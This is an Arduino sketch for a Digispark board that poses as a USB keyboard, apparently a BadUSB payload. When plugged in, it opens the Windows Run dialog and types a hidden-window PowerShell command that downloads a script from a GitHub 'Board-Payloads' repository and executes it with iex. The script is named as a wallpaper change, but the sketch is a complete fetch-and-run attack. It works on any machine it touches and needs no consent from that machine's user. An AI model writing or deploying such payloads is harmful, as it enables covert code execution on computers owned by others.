// WRITTEN BY SIAM RAHMAN
#include "DigiKeyboard.h"
 
void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
}
 
 
void loop() {
  // Initialise digispark
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(600);

  // Opens the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Writes the command
  DigiKeyboard.print("powershell -w h ");
  DigiKeyboard.print("iex (irm \"");
  DigiKeyboard.print("https://raw.githubusercontent.com/SIAMRAHMAN000/Board-Payloads/main/Shell%20Scripts/powershell/wallpaper.ps1");  // LINK HERE
  DigiKeyboard.print("\")");
  // Enters it
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
  blinkLed();
}

void blinkLed()
{
  while (true) {
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
